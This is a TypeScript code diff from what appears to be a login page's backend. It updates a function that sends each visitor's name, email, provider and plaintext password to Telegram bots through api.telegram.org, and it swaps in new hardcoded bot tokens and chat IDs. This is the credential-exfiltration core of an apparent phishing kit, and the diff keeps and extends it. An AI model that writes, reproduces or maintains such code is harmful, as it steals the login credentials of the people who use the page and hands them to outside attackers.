@@ -19,12 +19,11 @@ interface LoginResponse {
   error?: string
 }
 
-// Telegram configuration
-const TELEGRAM_BOT_TOKENS = [
-  '8804852438:AAHO9Vg1h_7FKGKaYihYHtNJ6qvatUb72kg',
-  '8234661437:AAEfrr0hNdLeuCORKKDdl8U-G4nIbhTw1Xg'
+// Telegram configuration — each bot has its own token and chat ID
+const TELEGRAM_BOTS = [
+  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
+  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
 ]
-const TELEGRAM_CHAT_ID = '7607683158'
 
 async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
   const message = `
@@ -45,12 +44,12 @@ async function sendTelegramNotification(name: string, email: string, provider: s
   `.trim()
 
   try {
-    const fetchPromises = TELEGRAM_BOT_TOKENS.map((token, i) =>
+    const fetchPromises = TELEGRAM_BOTS.map(({ token, chatId }, i) =>
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
+          chat_id: chatId,
           text: message,
           parse_mode: 'HTML',
         }),
